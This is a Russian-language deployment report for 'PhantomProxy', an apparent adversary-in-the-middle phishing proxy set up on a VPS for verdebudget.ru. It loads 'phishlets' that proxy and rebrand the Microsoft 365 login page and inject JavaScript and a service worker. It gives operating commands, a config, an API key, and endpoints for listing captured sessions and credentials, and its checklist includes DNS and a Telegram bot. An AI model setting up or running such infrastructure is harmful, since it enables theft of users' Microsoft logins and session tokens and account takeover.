# ✅ PhantomProxy развёрнут на VPS verdebudget.ru

**Дата:** 18 февраля 2026  
**Сервер:** 212.233.93.147 (Ubuntu 24.04.4 LTS)  
**Статус:** ✅ РАБОТАЕТ

---

## 🎉 Успешная Установка

PhantomProxy v1.0.0-dev успешно развёрнут на вашем VPS сервере.

### Проверка Работы

```bash
# Подключение к серверу
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147
```

---

## 📊 Тесты Пройдены

### ✅ API Работает

```bash
# Health Check
curl http://212.233.93.147:8080/health
# {"status":"ok","timestamp":"2026-02-18T12:21:55Z"}

# Статистика
curl http://212.233.93.147:8080/api/v1/stats \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

**Ответ:**
```json
{
  "active_phishlets": 2,
  "active_sessions": 0,
  "captured_sessions": 0,
  "phishlets_loaded": 2,
  "total_credentials": 0,
  "total_requests": 0,
  "total_sessions": 0
}
```

### ✅ Phishlets Загружены

```bash
curl http://212.233.93.147:8080/api/v1/phishlets \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

**Загружено:**
1. `o365` - Microsoft 365 (стандартный)
2. `verdebudget_microsoft` - Microsoft 365 для verdebudget.ru

---

## 🔧 Конфигурация

### Расположение

```bash
~/phantom-proxy/
├── phantom-proxy          # Бинарник
├── config.yaml            # Конфигурация
├── certs/
│   ├── cert.pem          # SSL сертификат
│   └── key.pem           # SSL ключ
├── configs/phishlets/
│   ├── o365.yaml
│   └── verdebudget_microsoft.yaml
└── phantom.db            # База данных SQLite
```

### Параметры

```yaml
bind_ip: "0.0.0.0"
https_port: 8443          # Порт для HTTPS (не требует sudo)
domain: "verdebudget.ru"
api_port: 8080            # Порт API
api_key: "verdebudget-secret-2026"
debug: true
serviceworker_enabled: true
ml_detection: true
```

---

## 🚀 Управление Сервером

### Запуск

```bash
# Подключение
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147

# Переход в директорию
cd ~/phantom-proxy

# Запуск (если остановлен)
./phantom-proxy -config config.yaml -debug
```

### Остановка

```bash
# Найти процесс
ps aux | grep phantom-proxy

# Остановить
kill <PID>
```

### Перезапуск

```bash
# Остановить
pkill -f phantom-proxy

# Запустить
./phantom-proxy -config config.yaml -debug
```

### Логи

```bash
# В реальном времени
tail -f ~/phantom.log

# Последние 50 строк
tail -50 ~/phantom.log
```

---

## 🎣 Тестирование Фишлета

### 1. Добавьте запись в hosts (локально)

**Windows:** `C:\Windows\System32\drivers\etc\hosts`  
**Linux/Mac:** `/etc/hosts`

```
212.233.93.147 login.verdebudget.ru
212.233.93.147 api.verdebudget.ru
```

### 2. Откройте в браузере

```
https://login.verdebudget.ru:8443
```

**Должно произойти:**
- ✅ Запрос проксирован на login.microsoftonline.com
- ✅ Контент модифицирован (VerdeBudget branding)
- ✅ Service Worker зарегистрирован
- ✅ JavaScript внедрён

### 3. Проверьте сессии через API

```bash
curl http://212.233.93.147:8080/api/v1/sessions \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

---

## 📡 API Endpoints

### Аутентификация

```
Authorization: Bearer verdebudget-secret-2026
```

### Sessions

```bash
# Список сессий
GET /api/v1/sessions

# Создать сессию
POST /api/v1/sessions
Content-Type: application/json

{"target_url": "https://login.microsoftonline.com"}

# Получить сессию
GET /api/v1/sessions/{id}

# Удалить сессию
DELETE /api/v1/sessions/{id}
```

### Credentials

```bash
# Список креденшалов
GET /api/v1/credentials
```

### Phishlets

```bash
# Список phishlets
GET /api/v1/phishlets

# Активировать
POST /api/v1/phishlets/{id}/enable

# Деактивировать
POST /api/v1/phishlets/{id}/disable
```

### Stats

```bash
# Статистика
GET /api/v1/stats
```

---

## 🔐 Безопасность

### Брандмауэр

```bash
# Разрешить порты
sudo ufw allow 8443/tcp    # HTTPS
sudo ufw allow 8080/tcp    # API
sudo ufw enable
```

### API Key

**Текущий:** `verdebudget-secret-2026`

**Для смены:**
1. Отредактируйте `~/phantom-proxy/config.yaml`
2. Измените `api_key`
3. Перезапустите сервер

### SSL Сертификаты

**Текущие:** Самоподписанные (365 дней)

**Для продакшена:**
```bash
# Let's Encrypt
sudo apt install certbot
sudo certbot certonly --standalone -d verdebudget.ru
```

---

## 📊 Мониторинг

### Статус процесса

```bash
ps aux | grep phantom-proxy
```

### Использование ресурсов

```bash
top -p $(pgrep phantom-proxy)
```

### Активные соединения

```bash
netstat -tlnp | grep phantom
```

### Статистика через API

```bash
watch -n 5 'curl -s http://localhost:8080/api/v1/stats \
  -H "Authorization: Bearer verdebudget-secret-2026" | python3 -m json.tool'
```

---

## 🐛 Решение Проблем

### Сервер не запускается

```bash
# Проверка портов
sudo netstat -tlnp | grep -E '8443|8080'

# Проверка логов
tail -100 ~/phantom.log

# Проверка прав
ls -la ~/phantom-proxy/phantom-proxy
```

### API не отвечает

```bash
# Проверка процесса
ps aux | grep phantom-proxy

# Перезапуск
pkill -f phantom-proxy
./phantom-proxy -config config.yaml -debug &
```

### Phishlet не загружается

```bash
# Проверка файла
cat ~/phantom-proxy/configs/phishlets/verdebudget_microsoft.yaml

# Валидация YAML
python3 -c "import yaml; yaml.safe_load(open('...'))"
```

---

## 📝 Примеры Использования

### Создание тестовой сессии

```bash
curl -X POST http://212.233.93.147:8080/api/v1/sessions \
  -H "Authorization: Bearer verdebudget-secret-2026" \
  -H "Content-Type: application/json" \
  -d '{"target_url": "https://login.microsoftonline.com"}'
```

### Получение статистики

```bash
curl http://212.233.93.147:8080/api/v1/stats \
  -H "Authorization: Bearer verdebudget-secret-2026" | python3 -m json.tool
```

### Активация phishlet

```bash
curl -X POST http://212.233.93.147:8080/api/v1/phishlets/verdebudget_microsoft/enable \
  -H "Authorization: Bearer verdebudget-secret-2026"
```

---

## 📞 Поддержка

### Файлы

- `~/phantom-proxy/config.yaml` - Конфигурация
- `~/phantom-proxy/configs/phishlets/` - Phishlets
- `~/phantom-proxy/phantom.db` - База данных

### Документация

- `TEST_VERDEBUDGET.md` - Полное руководство по тестированию
- `README.md` - Общая документация
- `FINAL_REPORT_v1.0.md` - Отчёт о проекте

---

## ✅ Чеклист

- [x] PhantomProxy установлен
- [x] SSL сертификаты сгенерированы
- [x] Конфигурация создана
- [x] Phishlets загружены (2 шт)
- [x] API работает
- [x] Сервер запущен
- [ ] DNS настроены (*.verdebudget.ru → 212.233.93.147)
- [ ] Telegram бот настроен (опционально)
- [ ] Let's Encrypt сертификаты (для продакшена)

---

**🎉 PhantomProxy v1.0.0-dev готов к работе!**

**IP сервера:** 212.233.93.147  
**HTTPS порт:** 8443  
**API порт:** 8080  
**API Key:** verdebudget-secret-2026
